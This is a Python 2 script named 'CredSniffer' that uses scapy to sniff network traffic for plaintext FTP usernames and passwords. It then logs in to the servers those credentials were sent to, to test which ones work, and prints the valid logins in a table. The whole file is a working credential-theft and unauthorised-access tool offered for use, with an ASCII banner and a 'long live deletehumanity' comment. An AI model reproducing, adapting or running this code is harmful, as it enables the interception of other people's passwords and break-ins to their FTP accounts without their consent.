# CredSniffer is still in production.
# long live deletehumanity
from scapy.all import *
import socket
import time
import sys
from ftplib import FTP
unames = []
pws = []
cons = []
valid = []
def revdns(addr):
	try:
		s = socket.gethostbyaddr(addr)
		return s[0]
	except:
		return ''
def Handler(pkt):
	global unames
	global pws
	try:
		try:
			dst = pkt[IP].dst
		except:
			dst = pkt[IPv6].dst
		dport = pkt[TCP].dport
		load = pkt[TCP].payload.load
		if 'USER' in load:
			print 'Connection made to ' + dst + ':' + str(dport) + '(' + revdns(dst) + ')'
			print load.strip()
			unames.append(load.strip()[5:])
			cons.append(dst)
		elif 'PASS' in load:
			print load.strip()
			print '-'*20
			pws.append(load.strip()[5:])
	except:
		pass
def checkftp(name, passw, addr):
	try:
		ftp = FTP(addr)
		ftp.login(user=name, passwd=passw)
		print '[VALID] ' + name + ':' + passw + '@' + addr
		valid.append(name + ':' + passw + '@' + addr)
	except:
		pass
def main():
	global valid
	global dst
	try:
		port = sys.argv[1]
	except:
		port = '21'
	if '-h' in sys.argv or '--help' in sys.argv:
		print 'Usage:\n\tpython ' + sys.argv[0] + '     // Sniffs on default port 21\n\tpython ' + sys.argv[0] + ' 24  // Sniffs on port 24'
		sys.exit()

	print '''
                   _           _  __  __ 
                  | |         (_)/ _|/ _| 
  ___ _ __ ___  __| |___ _ __  _| |_| |_ ___ _ __ 
 / __| '__/ _ \/ _` / __| '_ \| |  _|  _/ _ \ '__|
| (__| | |  __/ (_| \__ \ | | | | | | ||  __/ | 
 \___|_|  \___|\__,_|___/_| |_|_|_| |_| \___|_| 
        -- Author: @0xjack --
	'''
	print 'Sniffing for FTP credentials on port ' + port + '...\n\n'
	sniff(prn=Handler, filter='tcp port ' + port)
	if len(pws) > 0:
		try:
			check = raw_input('\n[-] Would you like to auto-check if the credentials are valid? [y/n] ')
		except KeyboardInterrupt:
			print '\n[!] Shutting down...\n'
			time.sleep(0.5)
			sys.exit()
		if check.lower().strip().lower() != 'y':
			print '\n[!] Shutting down...\n'
			sys.exit()
		num = 0
		for name in unames:
			checkftp(name, pws[num], cons[num])
			num += 1
		print '[+] Process complete. ' + str(len(pws)) + ' logins checked!'
		print '[+] ' + str(len(valid)) + ' valid logins found!'
		time.sleep(0.5)
		print '+' + '-'*60 + '+'
		for login in valid:
			print '| {0:58} |'.format(login)
		print '+' + '-'*60 + '+'
	else:
		print ''
if __name__ == '__main__':
	main()
